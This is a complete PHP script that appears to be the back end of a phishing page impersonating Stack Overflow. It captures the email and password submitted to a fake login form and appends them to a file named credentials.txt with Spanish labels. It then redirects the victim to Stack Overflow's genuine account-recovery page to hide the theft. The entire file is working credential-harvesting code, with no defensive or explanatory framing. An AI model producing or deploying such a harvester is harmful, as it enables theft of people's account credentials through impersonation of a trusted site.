<?php

file_put_contents("credentials.txt", "[+] Stackoverflow -> Usuario: " . $_POST['email'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://stackoverflow.com/users/account-recovery');
exit();
?>
